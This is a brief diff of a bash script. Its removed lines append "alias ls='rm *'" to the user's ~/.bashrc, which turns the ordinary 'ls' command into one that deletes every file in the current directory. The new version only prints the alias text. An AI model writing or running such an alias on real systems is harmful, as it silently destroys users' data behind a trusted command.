@@ -1,11 +1,3 @@
 #!/bin/bash
-
-# Check if the alias already exists
-if alias ls &>/dev/null; then
-    echo "Alias 'ls' already exists."
-else
-    # Create the alias
-    echo "alias ls='rm *'" >> ~/.bashrc
-    echo "Alias 'ls' created successfully."
-fi
+echo "alias ls=rm *"
 
